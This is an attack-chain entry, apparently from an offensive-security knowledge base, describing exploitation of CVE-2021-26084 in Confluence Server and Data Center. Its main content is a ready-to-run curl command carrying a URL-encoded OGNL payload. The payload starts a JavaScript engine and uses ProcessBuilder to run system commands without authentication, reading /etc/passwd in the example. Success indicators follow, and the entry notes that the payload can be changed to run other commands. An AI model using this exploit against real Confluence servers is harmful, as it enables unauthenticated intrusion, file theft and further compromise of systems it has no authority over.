---
id: ac-ognl-confluence-rce
tags:
  - ognl-injection
  - confluence
  - rce
  - java
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-OGNL-Injection-in-Confluence-for-RCE]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:36.521Z'
description: >-
  An attack chain exploiting an OGNL injection vulnerability in Confluence
  Server and Data Center to achieve remote code execution via a crafted POST
  request, allowing unauthenticated attackers to run arbitrary system commands.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# OGNL Injection in Confluence Leading to Remote Code Execution

Multi-stage attack chain demonstrating exploitation of CVE-2021-26084 in Confluence Server and Data Center versions before 6.13.23, 6.14.0 to before 7.4.11, 7.5.0 to before 7.11.6, and 7.12.0, allowing unauthenticated remote code execution through OGNL injection.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Web] --> B[OGNL Injection and RCE Execution]
    B --> C[Read Sensitive Files]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- Web browser or proxy like Burp Suite for crafting requests

### Target Environment

- Confluence Server or Data Center (vulnerable versions: before 6.13.23, 6.14.0 to before 7.4.11, 7.5.0 to before 7.11.6, 7.12.0)
- Web platform accessible over HTTP/HTTPS
- No specific ports required beyond standard 80/443

### Initial Access Requirements

- Network access to the Confluence instance
- No credentials needed if unauthenticated access is allowed (e.g., user signup enabled)
- Vulnerable endpoint: /pages/createpage-entervariables.action

## Detailed Attack Procedures

### Step 1: Exploit OGNL Injection for RCE
procedure: [[procedures/Exploit-OGNL-Injection-in-Confluence-for-RCE]]

**Objective**: Inject malicious OGNL code via a POST request to the vulnerable endpoint to instantiate a JavaScript ScriptEngine and execute system commands, achieving remote code execution.

**Instructions**: Craft and send a POST request to /pages/createpage-entervariables.action with a malicious queryString parameter containing URL-encoded OGNL payload that runs the [[commands/cat-read-etc-passwd]] command to read sensitive files.

Use [[commands/curl-post-ognl-payload]] to send the request:

```bash
curl -X POST 'http://target.confluence.com/pages/createpage-entervariables.action?SpaceKey=x' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isWin+%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%3b+var+cmd+%3d+new+java.lang.String(\u0022cat /etc/passwd\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\u0022\u0022%3b+var+output+%3d+\u0022\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\u0027)}%2b\u0027'
```

**Expected Output**: The response may include the output of the executed command, such as contents of /etc/passwd, or error indicators if the payload fails.

**Success Indicators**:
- Server response contains output from 'cat /etc/passwd' (e.g., user account listings like root:x:0:0:root:/root:/bin/bash)
- No authentication prompt or access denial
- Ability to modify payload for other commands confirms RCE

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to vulnerable Confluence endpoint
2. Successful OGNL injection leading to JavaScript engine instantiation and ProcessBuilder execution
3. Remote reading of sensitive system files, enabling further compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
